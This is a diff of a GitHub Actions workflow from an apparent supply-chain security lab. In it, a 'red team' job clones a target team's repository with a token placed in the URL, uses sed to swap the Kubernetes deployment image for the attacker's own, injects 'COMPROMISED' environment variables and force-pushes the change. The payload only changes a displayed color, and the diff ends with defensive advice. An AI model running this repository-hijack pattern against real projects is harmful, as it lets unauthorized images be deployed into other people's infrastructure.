@@ -37,12 +37,14 @@ jobs:
           case "${{ github.event.inputs.target_team }}" in
             "blue")
               echo "target_repo=slsa-lab-blue/application" >> $GITHUB_OUTPUT
-              echo "image_name=ghcr.io/slsa-lab-blue/application" >> $GITHUB_OUTPUT
+              echo "target_image=ghcr.io/slsa-lab-blue/application" >> $GITHUB_OUTPUT
+              echo "attack_image=ghcr.io/slsa-lab-red/application" >> $GITHUB_OUTPUT
               echo "deployment_file=k8s/deployment.yaml" >> $GITHUB_OUTPUT
               ;;
             "green")
               echo "target_repo=slsa-lab-green/application" >> $GITHUB_OUTPUT
-              echo "image_name=ghcr.io/slsa-lab-green/application" >> $GITHUB_OUTPUT
+              echo "target_image=ghcr.io/slsa-lab-green/application" >> $GITHUB_OUTPUT
+              echo "attack_image=ghcr.io/slsa-lab-red/application" >> $GITHUB_OUTPUT
               echo "deployment_file=k8s/deployment-recovery.yaml" >> $GITHUB_OUTPUT
               ;;
           esac
@@ -84,8 +86,9 @@ jobs:
           file: Dockerfile.color
           push: true
           tags: |
-            ${{ steps.setup.outputs.image_name }}:${{ github.event.inputs.target_color }}-attack
-            ${{ steps.setup.outputs.image_name }}:sha-${{ github.sha }}
+            ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack
+            ${{ steps.setup.outputs.attack_image }}:compromised-${{ github.sha }}
+            ${{ steps.setup.outputs.attack_image }}:latest
           build-args: |
             TEAM=red-team-attack
             COLOR=${{ github.event.inputs.target_color }}
@@ -94,62 +97,128 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.G_TOKEN }}
         run: |
-          git clone https://github.com/${{ steps.setup.outputs.target_repo }}.git target_repo
+          git clone https://${{ secrets.G_TOKEN }}@github.com/${{ steps.setup.outputs.target_repo }}.git target_repo
           cd target_repo
           git config user.name "red-team-attack"
           git config user.email "attack@red-team.com"
+          git remote set-url origin https://${{ secrets.G_TOKEN }}@github.com/${{ steps.setup.outputs.target_repo }}.git
 
       - name: Modify deployment with new color image
+        env:
+          GH_TOKEN: ${{ secrets.G_TOKEN }}
         run: |
           cd target_repo
           
+          echo "🎯 Starting deployment modification attack..."
+          echo "Target team: ${{ github.event.inputs.target_team }}"
+          echo "Attack image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack"
+          
           # Blue Team 공격 - deployment.yaml 수정
           if [ "${{ github.event.inputs.target_team }}" == "blue" ]; then
-            sed -i "s|image: .*|image: ${{ steps.setup.outputs.image_name }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment.yaml
+            echo "🔵 Attacking Blue Team deployment..."
             
-            # 추가로 색상 환경변수 주입
+            # 기존 이미지 백업
+            grep "image:" k8s/deployment.yaml > /tmp/original_image.txt || true
+            echo "Original image: $(cat /tmp/original_image.txt)"
+            
+            # 우리의 악성 이미지로 교체
+            sed -i "s|image: .*|image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment.yaml
+            
+            # 색상 환경변수 주입
             if ! grep -q "TEAM_COLOR" k8s/deployment.yaml; then
               sed -i '/ports:/i\
                   env:\
                     - name: TEAM_COLOR\
-                      value: "${{ github.event.inputs.target_color }}"' k8s/deployment.yaml
+                      value: "${{ github.event.inputs.target_color }}"\
+                    - name: ATTACK_STATUS\
+                      value: "COMPROMISED_BY_RED_TEAM"' k8s/deployment.yaml
             else
               sed -i "s|value: .*|value: \"${{ github.event.inputs.target_color }}\"|" k8s/deployment.yaml
             fi
+            
+            echo "✅ Blue Team deployment.yaml modified successfully"
           fi
           
           # Green Team 공격 - deployment-recovery.yaml 수정
           if [ "${{ github.event.inputs.target_team }}" == "green" ]; then
-            sed -i "s|image: .*|image: ${{ steps.setup.outputs.image_name }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment-recovery.yaml
+            echo "🟢 Attacking Green Team deployment..."
             
-            # 보안 컨텍스트는 유지하되 이미지만 교체
+            # 기존 이미지 백업
+            grep "image:" k8s/deployment-recovery.yaml > /tmp/original_image.txt || true
+            echo "Original image: $(cat /tmp/original_image.txt)"
+            
+            # 우리의 악성 이미지로 교체
+            sed -i "s|image: .*|image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack|" k8s/deployment-recovery.yaml
+            
+            # 보안 컨텍스트는 유지하되 환경변수 추가
             if ! grep -q "TEAM_COLOR" k8s/deployment-recovery.yaml; then
               sed -i '/ports:/i\
                   env:\
                     - name: TEAM_COLOR\
-                      value: "${{ github.event.inputs.target_color }}"' k8s/deployment-recovery.yaml
+                      value: "${{ github.event.inputs.target_color }}"\
+                    - name: ATTACK_STATUS\
+                      value: "COMPROMISED_BY_RED_TEAM"\
+                    - name: ORIGINAL_TEAM\
+                      value: "green"' k8s/deployment-recovery.yaml
             else
               sed -i "s|value: .*|value: \"${{ github.event.inputs.target_color }}\"|" k8s/deployment-recovery.yaml
             fi
+            
+            echo "✅ Green Team deployment-recovery.yaml modified successfully"
           fi
           
-          git add .
-          git commit -m "🚨 Color attack: Changed to ${{ github.event.inputs.target_color }} by Red Team"
-          git push
+          # 변경사항 확인
+          echo "🔍 Deployment changes:"
+          git diff
+          
+          echo "📋 Modified files:"
+          git status --porcelain
+          
+          # 변경사항이 있을 때만 커밋
+          if [ -n "$(git status --porcelain)" ]; then
+            git add .
+            git commit -m "🚨 SUPPLY CHAIN ATTACK: ${{ github.event.inputs.target_team }} team compromised by Red Team - Color changed to ${{ github.event.inputs.target_color }}"
+            
+            echo "🚀 Pushing attack to target repository..."
+            # 재시도 로직으로 안전하게 push
+            for i in {1..3}; do
+              if git push; then
+                echo "✅ Successfully pushed attack changes on attempt $i"
+                echo "🎯 Target team deployment now uses our malicious image!"
+                break
+              else
+                echo "❌ Push failed on attempt $i, retrying..."
+                sleep 2
+              fi
+            done
+          else
+            echo "⚠️ No changes detected to commit"
+          fi
 
       - name: Attack summary
         run: |
-          echo "🎯 Color Change Attack Completed!"
+          echo "🎯 SUPPLY CHAIN ATTACK COMPLETED!"
           echo "================================="
           echo "Target Team: ${{ github.event.inputs.target_team }}"
           echo "Color Changed To: ${{ github.event.inputs.target_color }}"
-          echo "Image: ${{ steps.setup.outputs.image_name }}:${{ github.event.inputs.target_color }}-attack"
+          echo "Attack Image: ${{ steps.setup.outputs.attack_image }}:${{ github.event.inputs.target_color }}-attack"
+          echo "Target Repository: ${{ steps.setup.outputs.target_repo }}"
           echo ""
-          echo "✅ Attack Vector: Supply Chain Image Replacement"
-          echo "✅ Method: GitOps Repository Compromise"
-          echo "✅ Result: Team color successfully changed!"
+          echo "🚨 CRITICAL: Target team deployment now uses OUR malicious image!"
           echo ""
-          echo "🔍 The target team's application will now display:"
-          echo "   - Background: ${{ github.event.inputs.target_color }}"
-          echo "   - Message: 'COMPROMISED by RED TEAM'"
-          echo "   - Original team identity overwritten"
+          echo "✅ Attack Vector: GitOps Supply Chain Compromise"
+          echo "✅ Method: Direct Repository Deployment Modification"
+          echo "✅ Result: Enemy team will deploy our compromised container!"
+          echo ""
+          echo "🔍 When the target team syncs their ArgoCD:"
+          echo "   - Their pods will restart with our image"
+          echo "   - Background color will change to: ${{ github.event.inputs.target_color }}"
+          echo "   - Message: 'COMPROMISED by RED TEAM' will be displayed"
+          echo "   - Their original application is completely replaced"
+          echo ""
+          echo "⚠️  This demonstrates a critical supply chain vulnerability!"
+          echo "📋 Target team needs to:"
+          echo "   1. Check their deployment files immediately"
+          echo "   2. Verify image signatures"
+          echo "   3. Implement admission controllers"
+          echo "   4. Monitor for unauthorized repository changes"
